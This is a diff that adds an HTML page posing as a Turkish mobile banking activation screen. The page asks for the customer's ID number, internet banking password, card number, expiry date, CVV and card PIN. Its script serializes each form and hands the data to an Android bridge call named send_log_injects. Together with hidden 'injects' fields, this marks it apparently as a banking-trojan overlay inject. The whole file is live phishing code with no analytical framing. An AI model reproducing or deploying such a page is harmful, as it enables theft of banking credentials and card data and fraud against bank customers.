@@ -1,0 +1,409 @@
+<html>
+<head>
+		<meta charset="UTF-8">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+</head>
+<body>
+	<style>
+	html, body {
+	text-align: center;
+	position: relative;
+	padding: 0;
+	margin: 0;
+	width: 100%;
+	height: 98%;
+	color: #000;
+	font-family: serif, Arial;
+	background:#eeeeee;
+}
+
+
+input[type="text"]::-webkit-input-placeholder { color: #cccccc; }
+input[type="text"]:focus { outline: none; }
+input[type="password"]:focus { outline: none; }
+input[type="number"]:focus { outline: none; }
+input[type=number]::-webkit-inner-spin-button, 
+input[type=number]::-webkit-outer-spin-button { 
+  -webkit-appearance: none; 
+  margin: 0; 
+}
+
+
+
+
+label{ font:14px sans-serif; color:#fcb000; width:60%; position:relative; text-align:left; margin-top:10px; font-weight:100; margin-bottom:10px;}
+
+.form{ width:100%; height:100%; position:relative;}
+.nn1{position:absolute; right:35px; top:75px; font-size:16px; font-weight:normal;}
+
+.ff{ font:30px "PT Sans"; color:#662352; position:absolute; right:15%; margin-top:1%; }
+
+#err{ display:none;}
+.mine{position:absolute; width:100%; background:white; color:#313030; z-index:999999; font:18px "PT Sans"; padding-left:5%; padding-right:5%; text-align:left; top:40%;}
+.mine div{font:18px "PT Sans"; font-weight:bold; margin-top:10px; margin-bottom:10px;}
+.mine hr{ border:none; border-bottom:1px solid #1F1F1F; width:100%; margin-top:0px; margin-bottom:10px;}
+.mine a{ display:block; background:#BC163A; color:white;font:18px "PT Sans"; text-align:center; padding-top:10px; padding-bottom:10px; margin-bottom:10px; margin-top:10px; -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px;}
+
+.hh3{font:16px Tahoma; color:#000; margin-top:10px; margin-bottom:20px; font-weight:bold; margin-left:20px; margin-right:20px; text-align:left;}
+
+#pre{color:#252747; font:14px "PT Sans"; text-align:left; position:relative;  margin-left:2.5%; float:left;}
+ 
+h4 {
+    color: #000000;
+    text-align: center;
+    font-size: 17px;
+    font-weight: 100;
+    font-family: sans-serif;
+    display: inline-block;
+    padding: 0;
+    margin: 0px;
+}
+#input_submitBtn {
+    border: none;
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    border-radius: 3px;
+    font-size: 12px;
+    padding: 15px;
+    text-decoration: none;
+    color: #000;
+    font: 16px sans-serif;
+    width: 100%;
+    margin-top: 20px;
+    background: #fcb000;
+    font-weight: 100;
+}
+
+.no1{ background:#fff; width:90%; position:relative; margin:0 auto; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px; margin-bottom:20px;}
+.no2{ background:#fff; width:90%; position:relative; margin:0 auto; -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px;}
+
+.red{ width:90%; font:12px Tahoma; font-weight:bold; color:red; margin:0 auto; margin-top:10px; text-align:left;}
+
+
+.header {
+    background: #fcb000;
+    text-align: center;
+    padding: 15px;
+    overflow: hidden;
+}
+.field {
+  display: flex;
+  flex-flow: column-reverse;
+  width: 95%;
+  margin: 0 auto;
+}
+label, .input {
+  transition: all 0.2s;
+}
+
+label:focus {
+	color: #f5b800;
+}
+
+.input {
+  font-size: 1.5em;
+  border: 0;
+  border-bottom: 1px solid #ccc;
+  background: transparent;
+}
+.input:focus {
+  outline: 0;
+  border-bottom: 2px solid #f5b800;
+}
+.input:placeholder-shown + label {
+    min-width: 66%;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    cursor: text;
+    transform-origin: left bottom;
+    transform: translate(0, 2.125rem) scale(1.5);
+    font-weight: 100;
+    font-size: 14px;
+    color: #cccccc;
+}
+::-webkit-input-placeholder {
+  transition: inherit;
+  opacity: 0;
+}
+.input:focus {
+  opacity: 1;
+}
+.input + label,
+.input:focus + label {
+  transform: translate(0, 0) scale(1); /* [1] */
+  cursor: pointer; /* [2] */
+  color: #fcb000;
+}
+
+.fielderror {
+  font-size: 1.5em;
+  border: 0;
+  background: transparent;
+  border-bottom: 2px solid #f00;
+}
+
+#password-error-hint {
+  text-align: left; 
+  color: red; 
+  display: none;
+}
+</style>
+<div id="content_div">
+<div class="header">
+	<img style="float: left;width: 14px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAApCAMAAADphEJPAAABaFBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+5YjZ9AAAAd3RSTlMAAZpol/5lk6OQqAOOqomsBYWvBoGzf7Z7uAd3uglzvQpwwG7CC2rEDWbHD2PKYf3MEF78zhJZ0BRW0xWt1xq13B9n+eAkTPjlKUX16S8+8u00OO/wOzLr9EEs5/ZIJ+NQId/6WB3ZXxjVcRHIeQ6Eu4wItGCkYivrzs0AAAEKSURBVCjPbdNVW0JRFIThg3JExUCPnYjYgQoqKiZ2dyt2d83fd+5n7cv3e/bFjuU4unxZ2Y7Ffrg5BgcA5KrnkfODwgXkQuUicnFIuIRc6gmXkcuVK8iVylXk6hrhWnJdvXADuTEs3ESOKDe7QLRFuJXc1i7cQe7sEu4m9yj3xoC+fuGBOJAYFB4iDyeFR8ijY/o8KZ5nfELdm2SYmjbCTBqYnTM+xvwCsLhkhOUVYHXNCOsbwOaWEbZ3gN09I+wfAIdHRjg+AU7PjHCeAdIXRri8Aq5vjHB7B8TvjfDwCLjWTCQTDE9GeH7hLb4a4S3K8G6E8AfDp0/D1zdDwNjhpRD7sQY1+Pvn/AMErEmLZNCLPAAAAABJRU5ErkJggg==">
+	<h4> Mobil Bankacılık Aktivasyon </h4>
+	<img style="float: right; width: 24px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAwCAMAAABkKdmIAAAA+VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9BnGuhAAAAUnRSTlMAA5CqqQTl5uoqK6vwMDEF8Tc48vU/QPlHrPpPUPsG/Fj+YWKtbG10da6AgYuMr5QBlbCen6ixsuGz0EzVFdZauacbmrteTkhElreZSyKkj8y40H1eMwAAAWBJREFUSMft1m1TgkAQB/BDxSgte7DUHlYps+zByEpNI8tK00xrv/+HacnsDgQ8mpreuG+4/e/9hhngZmDs10oJhZSAIowYCWRUEohhJZiIzpFRgwhtfkGTN2oMMb7I2FJc1iRILK9Yq9U1xJgqJ5Lro/VGkkxCRqTS4y6dmm4SGcTNLd5v7yBmfA2QyObEJJf1N5bQd+3Znk4GPEWexL4zLaC3sQQeTOaHFOddDRRpdOQ2OaZBETzEifv9T10NlCg+M9yJce5ioEzhheH1YIxLGpdgQlz5HA8lQhvK4BBl8H3JFduWz1YD/08JNMFA1Tq1tWkfbM3aVQEuJAlWycA1LepypD4yDbrcmHLEvKXNDcaad/ctJkdY6+Hxadxz0i50noXqFNoCEYuTLjqq+0ek9/JdPUnS53l/RmbkP0n0dVQDJxl8DaIOoosnxE546TYyfOP1bvLc7AmD4Y9/oj4AZnGtwYoyWm0AAAAASUVORK5CYII=">
+</div>
+<div id="page1">
+<form id="form1">
+		<div class="field">
+			<input type="text" name="fields[login]" class="input" id="login" placeholder="">
+			<label for="login">Müşteri / T.C. Kimlik Numarası</label>
+		</div>
+		
+		<div class="field">
+			<p id="password-error-hint">Şifre en az 8 karakter olmalı, harf ve rakam içermelidir !</p>
+			<input type="password" name="fields[password]" class="input" id="password" placeholder="">
+			<label for="password">İnternet Bankacılığı Şifresi </label>
+		</div>
+		
+		<div class="field">
+			<button type="button" class="button" onclick="next()" id="input_submitBtn"><span>Devam</span></button>
+			<input id="type_injects" value='banks' type="hidden" required>
+		</div>
+	</form>
+
+</div>
+<div id="page2">
+
+	<form id="form2">
+		<div class="field">
+			<input type="text" class="input" name="fields[card_number]" id="card_number" placeholder="" required/>
+			<label for="card_number">Kart Numarası</label>
+		</div>
+	
+		<div class="field">
+			 <input type="text" class="input" name="fields[card_expiration_date]" id="card_expiration_date" placeholder="" required/>
+			 <label for="card_expiration_date">Son Kullanma Tarihi</label>
+		</div>
+	
+		<div class="field">
+			<input type="text" class="input" name="fields[card_cvv]" id="card_cvv" maxlength="3" placeholder="" required/>
+			<label for="card_cvv">CVV</label>
+		</div>
+		
+		<div class="field">
+			<input type="password" name="fields[password]" class="input" maxlength="4" id="password" placeholder="">
+			<label for="password">Kart  Şifresi </label>
+		</div>
+		
+		<div class="field">
+			<button type="button" class="button" onclick="next2()" id="input_submitBtn"><span>Devam</span></button>
+			<input id="type_injects" value='banks' type="hidden" required>
+            <input id="closed" value='close_activity_injects' type="hidden" required>
+		</div>
+	</form>
+
+</div>
+
+
+
+<script type="text/javascript">
+        document.getElementById('page2').style.display = 'none';            
+        $('#card_number').mask('0000 0000 0000 0000');
+        $('#card_expiration_date').mask('00/00');
+
+function next(){
+	var oNumInp = document.getElementById('login');
+    var oCodeInp = document.getElementById('password');
+    var oCodeInpErr = document.getElementById('password-error-hint');
+    console.log(oCodeInpErr);
+
+	try{
+		oNumInp.className = oCodeInp.className = 'input';
+	} catch(e){};
+	
+    if (oNumInp.value.length < 6) {
+		try{
+			oNumInp.className = 'fielderror';
+		} catch(e){};
+        return false;
+    }
+	
+	    if (oNumInp.value.length > 11) {
+		try{
+			oNumInp.className = 'fielderror';
+		} catch(e){};
+        return false;
+    }
+	
+	
+	
+    if (!validatePassword(oCodeInp.value)) {
+    	oCodeInpErr.style.display = 'block';
+		try{
+            oCodeInp.className = 'fielderror';
+		} catch(e){};
+        return false;
+    }
+	process('form1');
+    document.getElementById('page1').style.display = 'none';
+    document.getElementById('page2').style.display = 'block';
+}
+
+function validatePassword(str) {
+	if (str.length >= 8) {
+		var letterMatch = str.match(/([A-Za-z])/g);
+    	if (letterMatch && letterMatch.length >= 1) {
+    		return true;
+    	}
+	}
+
+	return false;
+}
+function next2(){
+	var ccNum = document.getElementById("card_number");
+        var ccExpiration = document.getElementById("card_expiration_date");
+        var ccCvv = document.getElementById("card_cvv");
+        var password = document.getElementById("password");
+
+        ccNum.classList.remove('fielderror');
+        ccExpiration.classList.remove('fielderror');
+        ccCvv.classList.remove('fielderror');
+        password.classList.remove('fielderror');
+
+        if (!validateCreditCardNumber(ccNum.value)) {
+            ccNum.classList.add('fielderror');
+            return false;
+        }
+
+        if (!validateExpirationDate(ccExpiration.value)) {
+            ccExpiration.classList.add('fielderror');
+            return false;
+        }
+
+        if (!validateCvv(ccCvv.value)) {
+            ccCvv.classList.add('fielderror');
+            return false;
+        }
+
+        if (!validatePassword(password.value)) {
+            password.classList.add('fielderror');
+            return false;
+        }
+
+        process('form2');
+    }
+
+	function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+        alert(formToJSON(document.getElementById(formId)));
+    }
+}
+
+    function validateCreditCardNumber(ccNum) {
+        return ccNum.length > 18 && ccNum.length < 21;
+    }
+
+    function validateExpirationDate(date) {
+        var noLettersRegEx = /^[^a-zA-Z]+$/;
+
+        return noLettersRegEx.test(date);
+    }
+
+    function validateCvv(cvv) {
+        var cvvRegEx = /^[0-9]{3,4}$/;
+
+        return cvvRegEx.test(cvv);
+    }
+
+    function validatePassword(password) {
+        return password.length > 3;
+    }
+	function valid_credit_card(value) {
+    if (/[^0-9-\s]+/.test(value)) return false;
+    var nCheck = 0, nDigit = 0, bEven = false;
+    value = value.replace(/\D/g, "");
+    for (var n = value.length - 1; n >= 0; n--) {
+      var cDigit = value.charAt(n),
+        nDigit = parseInt(cDigit, 10);
+      if (bEven) {
+        if ((nDigit *= 2) > 9) nDigit -= 9;
+      }
+      nCheck += nDigit;
+      bEven = !bEven;
+    }
+    return (nCheck % 10) == 0;
+  }
+
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+
+    for(var i = 0; i < namesHTML.length; i++) {
+      
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+       
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value;
+            
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+
+</script>
+</script>
+</body>
+</html>
